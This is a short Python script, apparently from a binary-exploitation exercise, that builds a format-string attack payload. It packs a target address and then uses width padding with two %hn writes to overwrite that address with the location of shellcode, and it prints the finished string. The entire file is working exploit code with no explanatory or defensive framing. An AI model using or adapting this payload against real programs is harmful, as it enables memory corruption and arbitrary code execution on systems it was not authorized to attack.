def address_to_string(address):
    t1 = address % 256
    t = (address / 256)
    t2 = t % 256
    t = t / 256
    t3 = t % 256
    t = t / 256
    t4 = t % 256
    output = ""
    output += chr(t1)
    output += chr(t2)
    output += chr(t3)
    output += chr(t4)
    return output
address_to_write_to = 0x0804a028
shellcode_address = 0xbfffff50
hob = shellcode_address / (2**16)
lob = shellcode_address % (2**16)
offset = 4
attack = ""
attack += address_to_string(address_to_write_to+2)
attack += address_to_string(address_to_write_to)
attack += "%"
attack += ".%dx"%(hob-8)
attack += "%"
attack += "%d$hn"%offset
attack += "%"
attack += ".%dx"%(lob-hob)
attack += "%"
attack += "%d$hn"%(offset+1)
print(attack)
